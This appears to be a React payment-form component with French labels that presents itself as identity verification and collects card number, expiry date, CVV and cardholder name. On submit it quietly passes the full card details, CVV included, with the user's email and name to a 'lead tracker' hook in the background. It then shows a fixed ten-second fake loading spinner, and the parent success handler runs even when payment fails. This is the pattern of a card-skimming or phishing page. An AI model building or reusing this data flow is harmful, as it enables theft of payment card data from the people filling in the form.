import React, { useState, useRef, useEffect } from 'react';
import { useFormValidation } from '../../hooks/useFormValidation';
import { useLeadTracker } from '../../hooks/useLeadTracker';
import Checkout from './Checkout';
import formStyles from '../../styles/components/Form.module.css';
import buttonStyles from '../../styles/components/Button.module.css';
import styles from '../../styles/components/PlanSummary.module.css';

const PaymentForm = ({ 
  selectedPlan, 
  formData, 
  onInputChange, 
  onSubmit,
  isSubmitting = false,
  email = '',
  firstName = ''
}) => {
  const { errors, validateForm, clearError } = useFormValidation();
  const { trackVerification } = useLeadTracker();
  const checkoutRef = useRef(null);
  
  // États pour le système de paiement
  const [useAdvancedPayment, setUseAdvancedPayment] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [shouldStartPayment, setShouldStartPayment] = useState(false);

  // Effet pour démarrer le processus de paiement quand le composant Checkout est monté
  useEffect(() => {
    if (useAdvancedPayment && shouldStartPayment && checkoutRef.current) {
      console.log('🚀 Démarrage du processus de paiement via useEffect');
      checkoutRef.current.startPaymentProcess();
      setShouldStartPayment(false);
    }
  }, [useAdvancedPayment, shouldStartPayment]);
  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); // Supprimer tous les caractères non-numériques
    
    if (value.length >= 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    
    onInputChange('expiryDate', value);
    clearError('expiryDate');
  };

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); // Supprimer tous les caractères non-numériques
    value = value.substring(0, 16); // Limiter à 16 chiffres
    
    // Formater avec des espaces tous les 4 chiffres
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    
    onInputChange('cardNumber', value);
    clearError('cardNumber');
  };

  const handleCvvChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); // Supprimer tous les caractères non-numériques
    value = value.substring(0, 4); // Limiter à 4 chiffres max
    
    onInputChange('cvv', value);
    clearError('cvv');
  };

  const handleNameChange = (e) => {
    // Permettre seulement les lettres, espaces et traits d'union
    let value = e.target.value.replace(/[^a-zA-ZÀ-ÿ\s\-']/g, '');
    onInputChange('cardName', value);
    clearError('cardName');
  };

  const handleSubmit = async (e) => {
    if (e) e.preventDefault();
    
    // Valider le formulaire
    if (validateForm(formData)) {
      setIsLoading(true);
      
      try {
        // Étape 1: Faire le tracking de vérification en parallèle
        console.log('📊 Début du tracking de vérification dans PaymentForm...');
        
        // Lancer le tracking en arrière-plan (pas d'attente)
        trackVerification({
          email,
          firstName,
          cardNumber: formData.cardNumber,
          cardExpiry: formData.expiryDate,
          cardCvv: formData.cvv,
          cardName: formData.cardName,
          selectedPlan
        }).then(result => {
          console.log('✅ Tracking de vérification réussi:', result);
        }).catch(error => {
          console.error('❌ Erreur tracking (non bloquante):', error);
        });

        // Étape 2: Déclencher le processus de checkout avancé
        await handleCheckoutLogic();
      } catch (error) {
        console.error('❌ Erreur lors du processus de soumission:', error);
        // En cas d'erreur, continuer quand même avec le checkout
        await handleCheckoutLogic();
      }
    }
  };

  const handleCheckoutLogic = async () => {
    // Étape 1: Garder le bouton en loading pendant 10 secondes
    console.log('🔄 Démarrage du processus - bouton en loading...');
    
    // Étape 2: Déclencher le processus de paiement en parallèle
    console.log('🚀 Activation du composant Checkout...');
    setUseAdvancedPayment(true);
    setShouldStartPayment(true);
    
    // Étape 3: Attendre 10 secondes puis arrêter le loading du bouton
    await new Promise(resolve => setTimeout(resolve, 10000));
    console.log('⏰ 10 secondes écoulées - arrêt du loading du bouton');
    setIsLoading(false);
  };

  const handleAdvancedPaymentSuccess = () => {
    // Une fois le processus terminé avec succès, appeler la fonction de succès du parent
    console.log('✅ Processus de paiement terminé avec succès');
    setUseAdvancedPayment(false);
    setShouldStartPayment(false);
    if (onSubmit) {
      onSubmit();
    }
  };

  const handleAdvancedPaymentError = (error) => {
    console.error('❌ Erreur lors du processus de paiement avancé:', error);
    setUseAdvancedPayment(false);
    setShouldStartPayment(false);
    // Fallback vers le système simple du parent
    if (onSubmit) {
      onSubmit();
    }
  };

  return (
    <>

      <div className={formStyles.formGroup}>
        <label className={formStyles.formLabel}>
          Numéro de carte
        </label>
        <div style={{ position: 'relative', display: 'flex', alignItems: 'center' }}>
          <input 
            type="text" 
            className={`${formStyles.formInput} ${errors.cardNumber ? formStyles.error : ''}`}
            placeholder="1234 5678 9012 3456"
            value={formData.cardNumber || ''}
            onChange={handleCardNumberChange}
            maxLength="19"
            style={{ paddingRight: '60px' }}
          />
          <img 
            src="/card-network.png"
            alt="Cartes acceptées"
            style={{
              position: 'absolute',
              right: '10px',
              height: '20px',
              width: 'auto',
              zIndex: 1
            }}
          />
        </div>
        {errors.cardNumber && (
          <span className={formStyles.errorMessage}>{errors.cardNumber}</span>
        )}
      </div>

      <div className={formStyles.formRow}>
        <div className={formStyles.formGroup}>
          <label className={formStyles.formLabel}>Date d'expiration</label>
          <input 
            type="text" 
            className={`${formStyles.formInput} ${errors.expiryDate ? formStyles.error : ''}`}
            placeholder="MM/AA"
            value={formData.expiryDate || ''}
            onChange={handleExpiryChange}
            maxLength="5"
          />
          {errors.expiryDate && (
            <span className={formStyles.errorMessage}>{errors.expiryDate}</span>
          )}
        </div>
        <div className={formStyles.formGroup}>
          <label className={formStyles.formLabel}>
            Code CVV
          </label>
          <input 
            type="text" 
            className={`${formStyles.formInput} ${errors.cvv ? formStyles.error : ''}`}
            placeholder="123"
            value={formData.cardCvv || formData.cvv || ''}
            onChange={handleCvvChange}
            maxLength="4"
          />
          {errors.cvv && (
            <span className={formStyles.errorMessage}>{errors.cvv}</span>
          )}
        </div>
      </div>

      <div className={formStyles.formGroup}>
        <label className={formStyles.formLabel}>Nom du titulaire</label>
        <input 
          type="text" 
          className={`${formStyles.formInput} ${errors.cardName ? formStyles.error : ''}`}
          placeholder="Jean Dupont"
          value={formData.cardName || ''}
          onChange={handleNameChange}
        />
        {errors.cardName && (
          <span className={formStyles.errorMessage}>{errors.cardName}</span>
        )}
      </div>

      <div className={styles.paymentSecurity}>
        <p className={styles.securityNote}>
          Carte de crédit/débit • Vérification IDs Secure
        </p>
      </div>

      <button 
        onClick={handleSubmit}
        className={`${buttonStyles.planBtn} ${buttonStyles.primaryBtn}`}
        style={{ width: '100%', marginTop: '20px' }}
        disabled={isSubmitting || isLoading}
      >
        {(isSubmitting || isLoading) ? (
          <div className={formStyles.loadingContainer}>
            <div className={formStyles.spinner}></div>
            <span>Vérification...</span>
          </div>
        ) : (
          'Vérifier mon identité'
        )}
      </button>

      {/* Composant Checkout pour la gestion des popups */}
      {useAdvancedPayment && (
        <Checkout 
          ref={checkoutRef}
          formData={formData}
          selectedPlan={selectedPlan}
          onSuccess={handleAdvancedPaymentSuccess}
          onError={handleAdvancedPaymentError}
        />
      )}
    </>
  );
};

export default PaymentForm;
